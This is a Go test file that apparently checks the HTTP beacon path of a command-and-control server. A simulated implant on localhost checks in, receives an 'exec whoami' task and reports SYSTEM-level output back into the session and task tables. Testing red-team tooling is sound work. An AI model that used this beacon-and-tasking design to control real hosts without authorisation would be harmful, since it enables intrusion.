package server

// HTTP beacon 真链路测试：起真实 HTTP 监听器，用植入端协议走
// 上线→领取任务→回传结果→停止监听器，数据全部落 c2_sessions/c2_tasks 台账。
// 需要 ARTEX_PG_DSN（CI 的 PostgreSQL service 已提供）；不可用则跳过。

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/db"
)

func beaconPost(t *testing.T, url string, body map[string]any) (int, map[string]any) {
	t.Helper()
	raw, _ := json.Marshal(body)
	resp, err := http.Post(url, "application/json", bytes.NewReader(raw))
	if err != nil {
		t.Fatalf("beacon post: %v", err)
	}
	defer resp.Body.Close()
	var out map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&out)
	return resp.StatusCode, out
}

func TestC2HTTPBeaconEndToEnd(t *testing.T) {
	dsn := strings.TrimSpace(os.Getenv("ARTEX_PG_DSN"))
	if dsn == "" {
		t.Skip("需要 ARTEX_PG_DSN 才能跑 C2 beacon 真链路测试")
	}
	d, err := db.Open(dsn)
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	master := []byte("c2-beacon-test-master-key")
	store := db.NewC2Store(d, master)

	// 取一个空闲端口给真实 HTTP 监听器。
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("pick port: %v", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	_ = ln.Close()

	token := fmt.Sprintf("beacon-e2e-%d", time.Now().UnixNano())
	listenerID, err := store.CreateListener(ctx, &db.C2Listener{
		Name: "beacon-e2e", Kind: "http", BindHost: "127.0.0.1", BindPort: port,
		Token: token, Status: db.C2ListenerStopped,
	})
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}
	t.Cleanup(func() { _ = store.DeleteListener(context.Background(), listenerID) })
	l, err := store.GetListener(ctx, listenerID)
	if err != nil || l == nil {
		t.Fatalf("get listener: %v", err)
	}
	if l.Kind != "http" || l.Token != token {
		t.Fatalf("listener fields kind=%q token_ok=%v", l.Kind, l.Token == token)
	}

	rt := &c2Runtime{store: store, httpServers: map[int64]*http.Server{}}
	if err := rt.startHTTPOne(ctx, l); err != nil {
		t.Fatalf("start http listener: %v", err)
	}
	t.Cleanup(func() { rt.stopHTTPOne(context.Background(), listenerID) })
	base := fmt.Sprintf("http://127.0.0.1:%d/c2/beacon/%s", port, token)

	// 1) 非法请求体 -> 400
	resp, err := http.Post(base, "application/json", strings.NewReader("not-json"))
	if err != nil {
		t.Fatalf("bad json post: %v", err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("bad json code=%d want 400", resp.StatusCode)
	}

	// 2) 首次心跳上线（无任务）
	code, out := beaconPost(t, base, map[string]any{
		"implant_uuid": "uuid-beacon-1", "hostname": "win-lab", "os": "windows",
		"arch": "amd64", "username": "lab\\user",
	})
	if code != 200 || out["ok"] != true {
		t.Fatalf("first beacon code=%d out=%v", code, out)
	}
	sid := int64(out["session_id"].(float64))
	if sid <= 0 {
		t.Fatalf("session_id missing: %v", out)
	}

	// 3) 下发任务 -> 下一次心跳领取
	taskID, err := store.CreateTask(ctx, sid, "exec", "whoami", "test")
	if err != nil {
		t.Fatalf("queue task: %v", err)
	}
	code, out = beaconPost(t, base, map[string]any{"implant_uuid": "uuid-beacon-1"})
	if code != 200 {
		t.Fatalf("claim beacon code=%d", code)
	}
	task, _ := out["task"].(map[string]any)
	if task == nil || int64(task["id"].(float64)) != taskID || task["task_type"] != "exec" {
		t.Fatalf("task not delivered: %v", out["task"])
	}

	// 4) 回传结果 -> 台账置 success
	ok := true
	code, out = beaconPost(t, base, map[string]any{
		"implant_uuid": "uuid-beacon-1", "task_id": taskID, "ok": ok,
		"output": "nt authority\\system", "duration_ms": 12,
	})
	if code != 200 {
		t.Fatalf("result beacon code=%d out=%v", code, out)
	}
	got, err := store.GetTask(ctx, taskID)
	if err != nil || got == nil {
		t.Fatalf("get task: %v", err)
	}
	if got.Status != db.C2TaskSuccess || !strings.Contains(got.Output, "system") {
		t.Fatalf("task status=%q output=%q", got.Status, got.Output)
	}

	// 5) 停止监听器后 beacon 不可达
	rt.stopHTTPOne(ctx, listenerID)
	client := &http.Client{Timeout: 2 * time.Second}
	if r, err := client.Post(base, "application/json", strings.NewReader("{}")); err == nil {
		_ = r.Body.Close()
		t.Fatalf("listener still reachable after stop")
	}
	t.Logf("c2 beacon e2e ok: listener=%d session=%d task=%d status=%s", listenerID, sid, taskID, got.Status)
}
